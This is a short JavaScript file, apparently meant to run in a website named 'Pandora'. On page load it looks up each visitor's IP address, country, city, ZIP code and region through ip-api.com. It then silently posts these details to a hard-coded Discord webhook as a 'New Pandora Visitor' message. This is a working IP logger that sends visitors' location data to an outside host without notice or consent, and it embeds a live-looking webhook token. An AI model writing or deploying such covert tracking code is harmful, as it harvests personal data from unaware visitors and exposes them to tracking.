const webhook = "https://discord.com/api/webhooks/1473802841083740358/Fa1WpPDsIQiDj6aNqjIJj1jXvn81VJZT7nvALQpr4BDDBFufLuaxpySl1tq0DXFVwtX1"

async function IP_Info(){
    /**
     *  Description: On init , fetches IP information of user
     *  @return {fetch.Body.json()} Resp Body
     */
    let response = await fetch("https://ip-api.com/json", {
      method: 'GET',
      headers: {
        "cache-control" : "no-cache",
        "content-type": "application/json"
      }
    })
    return response.json()
  }
  IP_Info().then((value)=> {
    console.log('IP Info received:', value);
    let requiredInfo = [
      "status","country", "city", "zip", "regionName", "query"
    ]
    let noData = false

    for(var i = 0; i < requiredInfo.length; i++){
      if(typeof(value[`${requiredInfo[i]}`]) === 'undefined'){
        noData = true
        console.log('Missing field:', requiredInfo[i]);
        break
      } 
    }
    if(noData){
      console.log('Missing required data');
      return null
    }
    return value
  }).then( async (value) => {
    if(value !== null){
      console.log('Sending webhook...');
       await fetch(webhook, {
        method: 'POST',
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify({
          content: "**New Pandora Visitor**",
          embeds: [{
              title: "Pandora IP",
              type: "rich",
              color: 12223968,
              description: "```IP information of the recent website visitor.```",
              fields: [{
                name: "IP", value: `${value.query}`, inline: false
              },
              {
                name: "Country", value: `${value.country}`, inline: false
              },
              {
                name: "City", value: `${value.city}`, inline: false
              },
              {
                name: "ZIP", value: `${value.zip}`, inline: false
              },
              {
                name: "Region", value: `${value.regionName}`, inline: false
              }
              ],
              footer: {
                text: "Programmed by prod.orzech",
                icon_url: "https://media.discordapp.net/attachments/1241105227826855997/1473801023326912716/ChatGPT_Image_17_lut_2026_17_29_12.png?ex=699787a9&is=69963629&hm=24fede7ef2d64f42cc6cd3d0a1b0d04e8f3c894fa6f15ca329323a883de04d21&=&format=webp&quality=lossless"
              },
              thumbnail: {
                url: "https://media.discordapp.net/attachments/1241105227826855997/1473801023326912716/ChatGPT_Image_17_lut_2026_17_29_12.png?ex=699787a9&is=69963629&hm=24fede7ef2d64f42cc6cd3d0a1b0d04e8f3c894fa6f15ca329323a883de04d21&=&format=webp&quality=lossless"
              }
          }]
        })
      }).then((response)=>{
        console.log('Webhook sent successfully:', response.status, response.statusText)
      }).catch((err)=>{
        console.error('Webhook error:', err)
      })
    }
  }).catch((err)=> {
    console.error('IP fetch error:', err)
    console.log('Request not sent')
  })
